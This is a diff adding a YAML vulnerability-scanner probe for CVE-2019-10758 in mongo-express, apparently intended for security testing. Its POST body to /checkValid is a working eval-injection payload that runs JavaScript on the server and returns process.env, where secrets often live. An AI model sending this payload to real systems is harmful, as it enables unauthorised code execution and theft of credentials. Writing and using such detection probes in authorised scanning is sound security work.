@@ -1,0 +1,19 @@
+name: poc-mongo-express-rce
+transport: http
+set:
+  r0: randomLowercase(8)
+rules:
+  r0:
+    request:
+      method: POST
+      path: "/checkValid"
+      headers:
+        Content-Type: "application/x-www-form-urlencoded"
+      body: "document=this.constructor.constructor(%27return+process.env%27)()"
+    expression: response.status == 200 && (response.body.bcontains("PROCESS") || response.body.bcontains("process.env") || response.body.bcontains("CONFIG"))
+expression: r0()
+detail:
+  author: sxel
+  description: mongo-express eval injection RCE probe (CVE-2019-10758, pre-auth on exposed instances)
+  severity: critical
+  tags: mongo,express,rce,nodejs
